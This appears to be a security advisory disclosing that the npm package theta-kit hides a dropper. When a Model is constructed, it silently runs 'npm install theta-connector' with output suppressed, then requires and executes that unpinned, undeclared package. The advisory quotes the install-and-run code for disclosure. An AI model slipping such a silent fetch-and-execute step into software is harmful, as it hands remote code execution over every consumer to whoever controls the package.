summary: theta-kit silently installs and executes the unpinned, undeclared 'theta-connector' package on Model use
details: On construction of the exported `Model` class (and via the exported `resetor` static method), `dist/index.js` runs `execSync('npm install theta-connector --no-warnings --no-save --no-progress --loglevel silent')` and then `require('theta-connector')` followed by `new ThetaConnector({}).queryDBConnect()`. `theta-connector` is not declared in `package.json`, is unpinned (resolves to latest at the moment of execution), and is not referenced in the README. The fetch/exec is wrapped in try/catch blocks with empty handlers to suppress errors, and the install flags suppress warnings, progress, and logs. Any consumer that follows the documented API (defining a Model) triggers a silent runtime install and immediate execution of arbitrary code from whoever controls `theta-connector` on the npm registry — a hidden dropper / dependency-confusion vector that yields remote code execution inside every consumer process.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
